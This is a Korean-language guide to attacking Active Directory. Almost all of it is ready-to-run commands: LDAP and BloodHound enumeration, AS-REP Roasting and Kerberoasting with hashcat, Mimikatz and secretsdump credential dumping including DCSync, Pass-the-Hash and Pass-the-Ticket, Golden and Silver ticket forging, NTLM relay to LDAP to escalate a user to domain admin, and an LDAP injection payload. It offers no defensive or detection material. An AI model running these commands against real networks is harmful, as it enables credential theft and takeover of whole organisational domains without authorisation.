# Active Directory 공격 완전 가이드

## AD 구조 이해

```
Active Directory 도메인 구조:
  
  Forest: company.local
    └── Domain: corp.company.local
          ├── Domain Controller (DC)
          │     - LDAP (389/636)
          │     - Kerberos (88)
          │     - DNS (53)
          │     - SMB (445)
          │     - RPC (135)
          │
          ├── Organizational Unit (OU)
          │     ├── Users
          │     ├── Computers
          │     └── Groups
          │
          └── Group Policy Objects (GPO)
```

---

## 1. AD 정찰 (Enumeration)

### 익명/인증된 LDAP 열거

```bash
# LDAP 익명 조회 시도
ldapsearch -x -h DC_IP -b "dc=company,dc=local"

# 인증된 LDAP 열거
ldapsearch -x -h DC_IP \
    -D "COMPANY\user" -w "Password123" \
    -b "dc=company,dc=local" \
    "(objectclass=user)" \
    sAMAccountName userPrincipalName memberOf pwdLastSet

# 모든 사용자 목록
ldapsearch -x -h DC_IP -D "COMPANY\user" -w "Password123" \
    -b "dc=company,dc=local" "(objectClass=user)" sAMAccountName | \
    grep sAMAccountName | awk '{print $2}'

# 관리자 그룹 멤버
ldapsearch -x -h DC_IP -D "COMPANY\user" -w "Password123" \
    -b "dc=company,dc=local" \
    "(memberOf=CN=Domain Admins,CN=Users,dc=company,dc=local)" \
    sAMAccountName
```

### PowerView (도메인 내부 정찰)

```powershell
# PowerView 로드 (AMSI 우회 후)
. .\PowerView.ps1

# 기본 정보 수집
Get-Domain                          # 현재 도메인 정보
Get-DomainController                # DC 목록
Get-DomainPolicy                    # 도메인 정책 (비밀번호 정책 등)
(Get-DomainPolicy)."system access"  # 계정 잠금 정책

# 사용자 열거
Get-DomainUser                                    # 전체 사용자
Get-DomainUser -SPN                              # SPN 있는 서비스 계정 (Kerberoast 대상)
Get-DomainUser -UACFilter PASSWD_NOTREQD         # 비밀번호 불필요 계정
Get-DomainUser -UACFilter NOT_PREAUTH            # AS-REP Roasting 대상

# 컴퓨터 열거
Get-DomainComputer                               # 도메인 내 모든 컴퓨터
Get-DomainComputer -OperatingSystem "*Server*"   # 서버만
Get-DomainComputer -Ping                         # 생존 확인

# 그룹 열거
Get-DomainGroup                                  # 모든 그룹
Get-DomainGroupMember "Domain Admins"            # 관리자 목록
Get-DomainGroupMember "Enterprise Admins"        # 엔터프라이즈 관리자

# 공유 폴더
Find-DomainShare -CheckShareAccess              # 접근 가능한 공유
Invoke-ShareFinder -CheckShareAccess

# 로컬 관리자 (중요!)
Find-LocalAdminAccess                           # 현재 유저가 로컬 관리자인 호스트
Invoke-EnumerateLocalAdmin                      # 모든 로컬 관리자 그룹

# GPO 열거
Get-DomainGPO                                   # 모든 GPO
Get-DomainGPOLocalGroup                        # GPO로 관리되는 로컬 그룹
```

### BloodHound — 공격 경로 시각화

```bash
# 수집기: SharpHound (Windows)
.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\

# 또는 Python 버전 (Linux)
bloodhound-python -u user -p Password123 \
    -d company.local -dc DC_IP \
    -c All

# BloodHound 서버 실행
sudo neo4j start
bloodhound

# 핵심 쿼리 (Cypher)
# 도메인 관리자로의 최단 경로
MATCH p=shortestPath(
    (u:User {name:'USER@COMPANY.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@COMPANY.LOCAL'})
) RETURN p

# AS-REP Roasting 가능 계정
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Kerberoasting 가능 계정
MATCH (u:User) WHERE u.hasspn=true RETURN u

# DCSync 권한 있는 계정
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u
```

---

## 2. Kerberos 공격

### AS-REP Roasting

```bash
# 사전 인증 비활성화 계정 발견 및 해시 추출
# Impacket
python3 GetNPUsers.py company.local/ \
    -usersfile users.txt \
    -format hashcat \
    -outputfile asrep_hashes.txt \
    -dc-ip DC_IP

# 도메인 자격증명 있을 때
python3 GetNPUsers.py company.local/user:Password123 \
    -request \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 크래킹
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Kerberoasting

```bash
# SPN 열거 및 서비스 티켓 요청
python3 GetUserSPNs.py company.local/user:Password123 \
    -dc-ip DC_IP \
    -request \
    -outputfile kerberoast.txt

# 특정 사용자
python3 GetUserSPNs.py company.local/user:Password123 \
    -dc-ip DC_IP \
    -request-user svc_sql

# Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

# 크래킹
# RC4 (0x17) → mode 13100
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# AES256 (0x12) → mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt
```

---

## 3. 자격증명 추출

### Mimikatz

```batch
rem Mimikatz 실행 (관리자 권한 필요)
mimikatz.exe

rem LSASS 메모리에서 자격증명 추출
privilege::debug
sekurlsa::logonpasswords

rem NTLM 해시 추출
sekurlsa::msv

rem Kerberos 티켓 덤프
sekurlsa::tickets
sekurlsa::tickets /export

rem SAM 데이터베이스 (로컬 계정)
lsadump::sam

rem LSA Secrets
lsadump::secrets

rem 도메인 캐시된 자격증명 (MSCACHE)
lsadump::cache

rem DCSync (도메인 관리자 권한)
lsadump::dcsync /domain:company.local /user:krbtgt
lsadump::dcsync /domain:company.local /all /csv
```

### Secretsdump (원격)

```bash
# 원격 SAM 덤프
python3 secretsdump.py company.local/Administrator:Password123@TARGET_IP

# NTLM 해시로 (Pass-the-Hash)
python3 secretsdump.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP

# DCSync (도메인 관리자)
python3 secretsdump.py -just-dc-ntlm company.local/Administrator:Password123@DC_IP

# 볼륨 섀도우 복사본 활용
python3 secretsdump.py -use-vss company.local/Administrator:Password123@TARGET_IP
```

---

## 4. 권한 상승 체인

### Pass-the-Hash (PtH)

```bash
# NTLM 해시로 원격 실행
python3 wmiexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP

python3 psexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP

python3 smbexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP

# Evil-WinRM
evil-winrm -i TARGET_IP \
    -u Administrator \
    -H NTLM_HASH
```

### Pass-the-Ticket (PtT)

```bash
# Kerberos 티켓 사용
# 티켓 파일 임포트 (Mimikatz)
# kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Impacket
export KRB5CCNAME=/tmp/ticket.ccache
python3 psexec.py -k -no-pass company.local/user@TARGET_IP
```

### Overpass-the-Hash (Pass-the-Key)

```bash
# NTLM 해시 → Kerberos TGT 획득
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt

# AES 키 사용 (탐지 회피)
.\Rubeus.exe asktgt /user:Administrator /aes256:AES_KEY /opsec /ptt
```

---

## 5. 도메인 공격

### DCSync 공격

```bash
# 도메인 컨트롤러 복제 권한 있을 때 (DS-Replication-Get-Changes-All)
python3 secretsdump.py -just-dc \
    company.local/user:Password123@DC_IP

# 특정 계정 (krbtgt, Administrator)
python3 secretsdump.py -just-dc-user krbtgt \
    company.local/user:Password123@DC_IP

# 조건: Replicating Directory Changes All 권한 필요
# 권한 부여 방법 (BloodHound에서 경로 발견 후)
```

### Golden Ticket

```bash
# krbtgt 해시 획득 후 (DCSync)
# Mimikatz
kerberos::golden \
    /domain:company.local \
    /sid:S-1-5-21-XXXX-XXXX-XXXX \
    /krbtgt:KRBTGT_NTLM_HASH \
    /user:Administrator \
    /groups:512,513,518,519,520 \
    /ticket:golden.kirbi

# 티켓 사용
kerberos::ptt golden.kirbi

# Impacket
python3 ticketer.py \
    -nthash KRBTGT_HASH \
    -domain-sid S-1-5-21-XXXX \
    -domain company.local \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass company.local/Administrator@DC_IP
```

### Silver Ticket

```bash
# 서비스 계정 해시로 서비스 티켓 위조
# 예: CIFS 서비스 (파일 공유 접근)
python3 ticketer.py \
    -nthash SERVICE_ACCOUNT_HASH \
    -domain-sid S-1-5-21-XXXX \
    -domain company.local \
    -spn cifs/server.company.local \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 smbclient.py -k -no-pass company.local/Administrator@server.company.local
```

---

## 6. 신뢰 관계 공격

```bash
# 포레스트 간 신뢰 열거
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

# 신뢰 티켓으로 다른 도메인 접근
# inter-forest TGT 발급
.\Rubeus.exe asktgt /user:Administrator \
    /domain:source.local \
    /rc4:HASH \
    /ptt

# 신뢰 관계를 통한 SID 히스토리 공격
# (SIDHistory에 엔터프라이즈 관리자 SID 포함)
```

---

## 7. LDAP 공격

### LDAP 주입

```python
# 취약한 인증 코드
def authenticate(username, password):
    ldap_filter = f"(&(uid={username})(password={password}))"
    # → 인젝션 가능

# 공격 페이로드
username = "admin)(&"  # 필터 조작
# → (&(uid=admin)(&)(password=...)) = 항상 참

username = "*"  # 모든 사용자 반환
password = "*"
```

### LDAP Relay (NTLM Relay to LDAP)

```bash
# ntlmrelayx로 LDAP 릴레이
python3 ntlmrelayx.py \
    -t ldap://DC_IP \
    -smb2support \
    --escalate-user regular_user  # 일반 사용자를 도메인 관리자로

# 또는 새 컴퓨터 계정 생성 (기본 권한으로 가능)
python3 ntlmrelayx.py \
    -t ldaps://DC_IP \
    --add-computer
```

---

## 8. BloodHound 공격 경로 활용

```python
# 공통 공격 체인 예시

경로 1: 일반 사용자 → 도메인 관리자
  일반 사용자
    └─[Kerberoasting]→ 서비스 계정 비밀번호
         └─[Local Admin]→ 워크스테이션 A
              └─[Token Impersonation]→ 로그인된 IT 직원
                   └─[Local Admin on DC]→ 도메인 관리자

경로 2: 피싱 → 도메인 관리자
  사용자 PC
    └─[Mimikatz]→ 캐시된 자격증명
         └─[Pass-the-Hash]→ 다른 워크스테이션
              └─[Local Admin]→ 관리자 로그인된 세션
                   └─[Token]→ 도메인 관리자

경로 3: AS-REP Roasting
  사전 인증 없는 계정
    └─[AS-REP Hash]→ 크래킹
         └─[GenericAll on Group]→ 자기 자신을 DA에 추가
```

```bash
# BloodHound 자동 마킹
# 침해된 계정/컴퓨터 마킹
curl -X POST http://localhost:7474/db/data/cypher \
    -H "Content-Type: application/json" \
    -d '{"query": "MATCH (u:User {name:\"COMPROMISED@DOMAIN\"}) SET u.owned=true"}'
```
